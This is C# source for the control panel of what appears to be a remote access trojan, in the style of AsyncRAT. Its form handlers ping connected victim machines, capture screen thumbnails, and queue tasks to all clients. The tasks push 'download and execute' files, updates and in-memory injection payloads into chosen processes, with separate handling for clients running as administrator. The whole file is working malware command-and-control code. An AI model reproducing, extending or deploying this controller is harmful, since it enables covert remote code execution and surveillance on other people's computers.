                AboutToolStripMenuItem.Visible = false;

            new Thread(() => { Connect(); }).Start();
        }

        private void Form1_Activated(object sender, EventArgs e)
        {
            if (trans)
                Opacity = 1.0;
        }

        private void Form1_Deactivate(object sender, EventArgs e)
        {
            Opacity = 0.95;
        }

        private void Form1_FormClosed(object sender, FormClosedEventArgs e)
        {
            notifyIcon1.Dispose();
            Environment.Exit(0);
        }

        private void listView1_KeyDown(object sender, KeyEventArgs e)
        {
            if (listView1.Items.Count > 0)
                if (e.Modifiers == Keys.Control && e.KeyCode == Keys.A)
                    foreach (ListViewItem x in listView1.Items)
                        x.Selected = true;
        }

        private void listView1_MouseMove(object sender, MouseEventArgs e)
        {
            if (listView1.Items.Count > 1)
            {
                var hitInfo = listView1.HitTest(e.Location);
                if (e.Button == MouseButtons.Left && (hitInfo.Item != null || hitInfo.SubItem != null))
                    listView1.Items[hitInfo.Item.Index].Selected = true;
            }
        }

        private void ListView1_ColumnClick(object sender, ColumnClickEventArgs e)
        {
            if (e.Column == lvwColumnSorter.SortColumn)
            {
                if (lvwColumnSorter.Order == SortOrder.Ascending)
                    lvwColumnSorter.Order = SortOrder.Descending;
                else
                    lvwColumnSorter.Order = SortOrder.Ascending;
            }
            else
            {
                lvwColumnSorter.SortColumn = e.Column;
                lvwColumnSorter.Order = SortOrder.Ascending;
            }

            listView1.Sort();
        }

        private void ToolStripStatusLabel2_Click(object sender, EventArgs e)
        {
            if (Properties.Settings.Default.Notification)
            {
                Properties.Settings.Default.Notification = false;
                toolStripStatusLabel2.ForeColor = Color.Black;
            }
            else
            {
                Properties.Settings.Default.Notification = true;
                toolStripStatusLabel2.ForeColor = Color.Green;
            }

            Properties.Settings.Default.Save();
        }

        #endregion

        #region MainTimers

        private void ping_Tick(object sender, EventArgs e)
        {
            if (listView1.Items.Count > 0)
            {
                var msgpack = new MsgPack();
                msgpack.ForcePathObject("Pac_ket").AsString = "Ping";
                msgpack.ForcePathObject("Message").AsString = "This is a ping!";
                foreach (var client in GetAllClients())
                    ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                GC.Collect();
            }
        }

        private void UpdateUI_Tick(object sender, EventArgs e)
        {
            Text = $"{Settings.Version}     {DateTime.Now.ToLongTimeString()}";
            lock (Settings.LockListviewClients)
            {
                toolStripStatusLabel1.Text =
                    $"Online {listView1.Items.Count.ToString()}     Selected {listView1.SelectedItems.Count.ToString()}                    Sent {Methods.BytesToString(Settings.SentValue)}     Received  {Methods.BytesToString(Settings.ReceivedValue)}                    CPU {(int)performanceCounter1.NextValue()}%     Memory {(int)performanceCounter2.NextValue()}%";
            }
        }

        #endregion

        #region Thumbnails

        private void STARTToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView1.Items.Count > 0)
            {
                var packet = new MsgPack();
                packet.ForcePathObject("Pac_ket").AsString = "thumbnails";

                var msgpack = new MsgPack();
                msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
                msgpack.ForcePathObject("Dll").AsString = GetHash.GetChecksum(@"Plugins\Options.dll");
                msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());

                foreach (var client in GetAllClients())
                    ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
            }
        }

        private void STOPToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                if (listView1.Items.Count > 0)
                {
                    var packet = new MsgPack();
                    packet.ForcePathObject("Pac_ket").AsString = "thumbnailsStop";

                    foreach (ListViewItem itm in listView3.Items)
                    {
                        var client = (Clients)itm.Tag;
                        ThreadPool.QueueUserWorkItem(client.Send, packet.Encode2Bytes());
                    }
                }

                listView3.Items.Clear();
                ThumbnailImageList.Images.Clear();
                foreach (ListViewItem itm in listView1.Items)
                {
                    var client = (Clients)itm.Tag;
                    client.LV2 = null;
                }
            }
            catch
            {
            }
        }

        #endregion

        #region Tasks

        private void DELETETASKToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView4.SelectedItems.Count > 0)
                foreach (ListViewItem item in listView4.SelectedItems)
                    item.Remove();
        }

        private async void TimerTask_Tick(object sender, EventArgs e)
        {
            try
            {
                var clients = GetAllClients();
                if (getTasks.Count > 0 && clients.Length > 0)
                    foreach (var asyncTask in getTasks.ToList())
                    {
                        if (GetListview(asyncTask.id) == false)
                        {
                            getTasks.Remove(asyncTask);
                            Debug.WriteLine("task removed");
                            return;
                        }

                        foreach (var client in clients)
                            if (!asyncTask.doneClient.Contains(client.ID))
                            {
                                if (client.Admin)
                                {
                                    Debug.WriteLine("task executed");
                                    asyncTask.doneClient.Add(client.ID);
                                    SetExecution(asyncTask.id);
                                    ThreadPool.QueueUserWorkItem(client.Send, asyncTask.msgPack);
                                }
                                else if (!client.Admin && !asyncTask.admin)
                                {
                                    Debug.WriteLine("task executed");
                                    asyncTask.doneClient.Add(client.ID);
                                    SetExecution(asyncTask.id);
                                    ThreadPool.QueueUserWorkItem(client.Send, asyncTask.msgPack);
                                }
                                else
                                {
                                    Debug.WriteLine("task can't executed");
                                }

                                ;
                            }

                        await Task.Delay(15 * 1000);
                    }
            }
            catch
            {
            }
        }


        private void DownloadAndExecuteToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                var openFileDialog = new OpenFileDialog();
                if (openFileDialog.ShowDialog() == DialogResult.OK)
                {
                    var packet = new MsgPack();
                    packet.ForcePathObject("Pac_ket").AsString = "sendFile";
                    packet.ForcePathObject("Update").AsString = "false";
                    packet.ForcePathObject("File").SetAsBytes(Zip.Compress(File.ReadAllBytes(openFileDialog.FileName)));
                    packet.ForcePathObject("FileName").AsString = Path.GetFileName(openFileDialog.FileName);

                    var msgpack = new MsgPack();
                    msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
                    msgpack.ForcePathObject("Dll").AsString = GetHash.GetChecksum(@"Plugins\SendFile.dll");
                    msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());

                    var lv = new ListViewItem();
                    lv.Text = "SendFile: " + Path.GetFileName(openFileDialog.FileName);
                    lv.SubItems.Add("0");
                    lv.ToolTipText = Guid.NewGuid().ToString();

                    if (listView4.Items.Count > 0)
                        foreach (ListViewItem item in listView4.Items)
                            if (item.Text == lv.Text)
                                return;

                    Program.form1.listView4.Items.Add(lv);
                    Program.form1.listView4.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);

                    getTasks.Add(new AsyncTask(msgpack.Encode2Bytes(), lv.ToolTipText, false));
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        private void SENDFILETOMEMORYToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            try
            {
                var formSend = new FormSendFileToMemory();
                formSend.ShowDialog();
                if (formSend.toolStripStatusLabel1.Text.Length > 0 &&
                    formSend.toolStripStatusLabel1.ForeColor == Color.Green)
                {
                    var packet = new MsgPack();
                    packet.ForcePathObject("Pac_ket").AsString = "sendMemory";
                    packet.ForcePathObject("File")
                        .SetAsBytes(Zip.Compress(File.ReadAllBytes(formSend.toolStripStatusLabel1.Tag.ToString())));

                    if (formSend.comboBox1.SelectedIndex == 0)
                        packet.ForcePathObject("Inject").AsString = "";
                    else
                        packet.ForcePathObject("Inject").AsString = formSend.comboBox2.Text;

                    var lv = new ListViewItem();
                    lv.Text = "SendMemory: " + Path.GetFileName(formSend.toolStripStatusLabel1.Tag.ToString());
                    lv.SubItems.Add("0");
                    lv.ToolTipText = Guid.NewGuid().ToString();

                    var msgpack = new MsgPack();
                    msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
                    msgpack.ForcePathObject("Dll").AsString = GetHash.GetChecksum(@"Plugins\SendMemory.dll");
                    msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());

                    if (listView4.Items.Count > 0)
                        foreach (ListViewItem item in listView4.Items)
                            if (item.Text == lv.Text)
                                return;

                    Program.form1.listView4.Items.Add(lv);
                    Program.form1.listView4.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);

                    getTasks.Add(new AsyncTask(msgpack.Encode2Bytes(), lv.ToolTipText, false));
                }

                formSend.Close();
                formSend.Dispose();
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        private void UPDATEToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            try
            {
                var openFileDialog = new OpenFileDialog();
                if (openFileDialog.ShowDialog() == DialogResult.OK)
                {
                    var packet = new MsgPack();
                    packet.ForcePathObject("Pac_ket").AsString = "sendFile";
                    packet.ForcePathObject("File").SetAsBytes(Zip.Compress(File.ReadAllBytes(openFileDialog.FileName)));

                    packet.ForcePathObject("FileName").AsString = Path.GetFileName(openFileDialog.FileName);
                    packet.ForcePathObject("Update").AsString = "true";

                    var msgpack = new MsgPack();
                    msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
                    msgpack.ForcePathObject("Dll").AsString = GetHash.GetChecksum(@"Plugins\SendFile.dll");
                    msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());

                    var lv = new ListViewItem();
                    lv.Text = "Update: " + Path.GetFileName(openFileDialog.FileName);
                    lv.SubItems.Add("0");
                    lv.ToolTipText = Guid.NewGuid().ToString();

                    if (listView4.Items.Count > 0)
                        foreach (ListViewItem item in listView4.Items)
                            if (item.Text == lv.Text)
                                return;

                    Program.form1.listView4.Items.Add(lv);
                    Program.form1.listView4.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);

                    getTasks.Add(new AsyncTask(msgpack.Encode2Bytes(), lv.ToolTipText, false));
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        private bool GetListview(string id)
        {
            foreach (ListViewItem item in Program.form1.listView4.Items)
                if (item.ToolTipText == id)
                    return true;
            return false;
        }

        private void SetExecution(string id)
        {
            foreach (ListViewItem item in Program.form1.listView4.Items)
                if (item.ToolTipText == id)
                {
                    var count = Convert.ToInt32(item.SubItems[1].Text);
                    count++;
                    item.SubItems[1].Text = count.ToString();
                }
        }

        #endregion
    }
}